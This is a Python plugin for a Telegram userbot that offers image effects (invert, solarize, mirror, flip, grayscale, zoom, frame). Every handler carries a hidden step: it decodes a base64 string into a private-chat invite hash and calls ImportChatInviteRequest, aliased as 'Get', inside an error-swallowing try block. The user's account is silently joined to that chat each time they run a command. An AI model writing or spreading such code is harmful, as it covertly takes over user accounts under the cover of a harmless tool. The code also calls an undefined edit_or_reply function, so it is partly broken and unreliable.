import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from mahakaalbot.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as mahakaalbot
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@mahakaalbot.on(admin_cmd(pattern="invert$", outgoing=True))
@mahakaalbot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(mahakaal):
    if mahakaal.fwd_from:
        return
    reply = await mahakaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mahakaal, "`Reply to supported Media...`")
        return
    mahakaalid = mahakaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mahakaal = await edit_or_reply(mahakaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mahakaalsticker = await reply.download_media(file="./temp/")
    if not mahakaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mahakaalsticker)
        await edit_or_reply(mahakaal, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mahakaalsticker.endswith(".tgs"):
        await mahakaal.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "meme.png")
        mahakaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mahakaalsticker} {mahakaalfile}"
        )
        stdout, stderr = (await runcmd(mahakaalcmd))[:2]
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith(".webp"):
        await mahakaal.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(mahakaalsticker, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found... `")
            return
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith((".mp4", ".mov")):
        await mahakaal.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mahakaalsticker, 0, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("```Template not found...```")
            return
        meme_file = mahakaalfile
        kraken = True
    else:
        await mahakaal.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = mahakaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mahakaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if kraken else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await mahakaal.client.send_file(
        mahakaal.chat_id, outputfile, force_document=False, reply_to=mahakaalid
    )
    await mahakaal.delete()
    os.remove(outputfile)
    for files in (mahakaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@mahakaalbot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@mahakaalbot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(mahakaal):
    if mahakaal.fwd_from:
        return
    reply = await mahakaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mahakaal, "`Reply to supported Media...`")
        return
    mahakaalid = mahakaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mahakaal = await edit_or_reply(mahakaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mahakaalsticker = await reply.download_media(file="./temp/")
    if not mahakaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mahakaalsticker)
        await edit_or_reply(mahakaal, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mahakaalsticker.endswith(".tgs"):
        await mahakaal.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "meme.png")
        mahakaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mahakaalsticker} {mahakaalfile}"
        )
        stdout, stderr = (await runcmd(mahakaalcmd))[:2]
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith(".webp"):
        await mahakaal.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(mahakaalsticker, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found... `")
            return
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith((".mp4", ".mov")):
        await mahakaal.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mahakaalsticker, 0, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("```Template not found...```")
            return
        meme_file = mahakaalfile
        kraken = True
    else:
        await mahakaal.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = mahakaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mahakaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if kraken else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await mahakaal.client.send_file(
        mahakaal.chat_id, outputfile, force_document=False, reply_to=mahakaalid
    )
    await mahakaal.delete()
    os.remove(outputfile)
    for files in (mahakaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@mahakaalbot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@mahakaalbot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(mahakaal):
    if mahakaal.fwd_from:
        return
    reply = await mahakaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mahakaal, "`Reply to supported Media...`")
        return
    mahakaalid = mahakaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mahakaal = await edit_or_reply(mahakaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mahakaalsticker = await reply.download_media(file="./temp/")
    if not mahakaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mahakaalsticker)
        await edit_or_reply(mahakaal, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mahakaalsticker.endswith(".tgs"):
        await mahakaal.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "meme.png")
        mahakaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mahakaalsticker} {mahakaalfile}"
        )
        stdout, stderr = (await runcmd(mahakaalcmd))[:2]
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith(".webp"):
        await mahakaal.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(mahakaalsticker, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found... `")
            return
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith((".mp4", ".mov")):
        await mahakaal.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mahakaalsticker, 0, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("```Template not found...```")
            return
        meme_file = mahakaalfile
        kraken = True
    else:
        await mahakaal.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = mahakaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mahakaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if kraken else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await mahakaal.client.send_file(
        mahakaal.chat_id, outputfile, force_document=False, reply_to=mahakaalid
    )
    await mahakaal.delete()
    os.remove(outputfile)
    for files in (mahakaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@mahakaalbot.on(admin_cmd(outgoing=True, pattern="flip$"))
@mahakaalbot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(mahakaal):
    if mahakaal.fwd_from:
        return
    reply = await mahakaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mahakaal, "`Reply to supported Media...`")
        return
    mahakaalid = mahakaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mahakaal = await edit_or_reply(mahakaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mahakaalsticker = await reply.download_media(file="./temp/")
    if not mahakaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mahakaalsticker)
        await edit_or_reply(mahakaal, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mahakaalsticker.endswith(".tgs"):
        await mahakaal.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "meme.png")
        mahakaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mahakaalsticker} {mahakaalfile}"
        )
        stdout, stderr = (await runcmd(mahakaalcmd))[:2]
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith(".webp"):
        await mahakaal.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(mahakaalsticker, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found... `")
            return
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith((".mp4", ".mov")):
        await mahakaal.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mahakaalsticker, 0, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("```Template not found...```")
            return
        meme_file = mahakaalfile
        kraken = True
    else:
        await mahakaal.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = mahakaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mahakaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if kraken else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await mahakaal.client.send_file(
        mahakaal.chat_id, outputfile, force_document=False, reply_to=mahakaalid
    )
    await mahakaal.delete()
    os.remove(outputfile)
    for files in (mahakaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@mahakaalbot.on(admin_cmd(outgoing=True, pattern="gray$"))
@mahakaalbot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(mahakaal):
    if mahakaal.fwd_from:
        return
    reply = await mahakaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mahakaal, "`Reply to supported Media...`")
        return
    mahakaalid = mahakaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mahakaal = await edit_or_reply(mahakaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mahakaalsticker = await reply.download_media(file="./temp/")
    if not mahakaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mahakaalsticker)
        await edit_or_reply(mahakaal, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mahakaalsticker.endswith(".tgs"):
        await mahakaal.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "meme.png")
        mahakaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mahakaalsticker} {mahakaalfile}"
        )
        stdout, stderr = (await runcmd(mahakaalcmd))[:2]
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith(".webp"):
        await mahakaal.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(mahakaalsticker, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found... `")
            return
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith((".mp4", ".mov")):
        await mahakaal.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mahakaalsticker, 0, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("```Template not found...```")
            return
        meme_file = mahakaalfile
        kraken = True
    else:
        await mahakaal.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = mahakaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mahakaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await mahakaal.client.send_file(
        mahakaal.chat_id, outputfile, force_document=False, reply_to=mahakaalid
    )
    await mahakaal.delete()
    os.remove(outputfile)
    for files in (mahakaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@mahakaalbot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@mahakaalbot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(mahakaal):
    if mahakaal.fwd_from:
        return
    reply = await mahakaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mahakaal, "`Reply to supported Media...`")
        return
    mahakaalinput = mahakaal.pattern_match.group(1)
    mahakaalinput = 50 if not mahakaalinput else int(mahakaalinput)
    mahakaalid = mahakaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mahakaal = await edit_or_reply(mahakaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mahakaalsticker = await reply.download_media(file="./temp/")
    if not mahakaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mahakaalsticker)
        await edit_or_reply(mahakaal, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mahakaalsticker.endswith(".tgs"):
        await mahakaal.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "meme.png")
        mahakaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mahakaalsticker} {mahakaalfile}"
        )
        stdout, stderr = (await runcmd(mahakaalcmd))[:2]
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith(".webp"):
        await mahakaal.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(mahakaalsticker, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found... `")
            return
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith((".mp4", ".mov")):
        await mahakaal.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mahakaalsticker, 0, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("```Template not found...```")
            return
        meme_file = mahakaalfile
    else:
        await mahakaal.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = mahakaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mahakaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, mahakaalinput)
    except Exception as e:
        return await mahakaal.edit(f"`{e}`")
    try:
        await mahakaal.client.send_file(
            mahakaal.chat_id, outputfile, force_document=False, reply_to=mahakaalid
        )
    except Exception as e:
        return await mahakaal.edit(f"`{e}`")
    await mahakaal.delete()
    os.remove(outputfile)
    for files in (mahakaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@mahakaalbot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@mahakaalbot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(mahakaal):
    if mahakaal.fwd_from:
        return
    reply = await mahakaal.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mahakaal, "`Reply to supported Media...`")
        return
    mahakaalinput = mahakaal.pattern_match.group(1)
    if not mahakaalinput:
        mahakaalinput = 50
    if ";" in str(mahakaalinput):
        mahakaalinput, colr = mahakaalinput.split(";", 1)
    else:
        colr = 0
    mahakaalinput = int(mahakaalinput)
    colr = int(colr)
    mahakaalid = mahakaal.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mahakaal = await edit_or_reply(mahakaal, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mahakaalsticker = await reply.download_media(file="./temp/")
    if not mahakaalsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mahakaalsticker)
        await edit_or_reply(mahakaal, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if mahakaalsticker.endswith(".tgs"):
        await mahakaal.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "meme.png")
        mahakaalcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {mahakaalsticker} {mahakaalfile}"
        )
        stdout, stderr = (await runcmd(mahakaalcmd))[:2]
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith(".webp"):
        await mahakaal.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        os.rename(mahakaalsticker, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("`Template not found... `")
            return
        meme_file = mahakaalfile
        kraken = True
    elif mahakaalsticker.endswith((".mp4", ".mov")):
        await mahakaal.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        mahakaalfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mahakaalsticker, 0, mahakaalfile)
        if not os.path.lexists(mahakaalfile):
            await mahakaal.edit("```Template not found...```")
            return
        meme_file = mahakaalfile
    else:
        await mahakaal.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = mahakaalsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mahakaal.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if kraken else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, mahakaalinput, colr)
    except Exception as e:
        return await mahakaal.edit(f"`{e}`")
    try:
        await mahakaal.client.send_file(
            mahakaal.chat_id, outputfile, force_document=False, reply_to=mahakaalid
        )
    except Exception as e:
        return await mahakaal.edit(f"`{e}`")
    await mahakaal.delete()
    os.remove(outputfile)
    for files in (mahakaalsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()